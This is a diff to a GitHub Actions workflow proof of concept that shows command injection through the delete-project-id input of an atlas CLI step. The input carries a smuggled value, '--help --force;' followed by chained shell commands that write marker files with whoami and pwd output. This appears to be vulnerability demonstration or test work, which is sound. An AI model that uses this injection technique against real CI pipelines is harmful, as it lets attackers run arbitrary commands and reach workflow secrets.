@@ -18,11 +18,10 @@ jobs:
         continue-on-error: true
         with:
           # This demonstrates command injection - the semicolon allows command chaining
-          # The injected command will execute even if atlas fails (semicolon separates commands)
+          # We use --help to make atlas succeed, then inject commands that execute
           # Format: atlas project delete ${{ inputs.delete-project-id }} --force
-          # We put --force right after the project ID, then inject commands
-          # Using || true to ensure the injection completes even with -e flag
-          delete-project-id: "507f1f77bcf86cd799439011 --force; (echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt && echo 'Injected via delete-project-id!' && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) > /tmp/poc-delete-project-info.txt) || true #"
+          # Using --help makes the command succeed, then our injected commands execute
+          delete-project-id: "--help --force; echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt && echo 'Injected via delete-project-id!' && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) > /tmp/poc-delete-project-info.txt #"
 
       - name: Verify Injection
         shell: bash
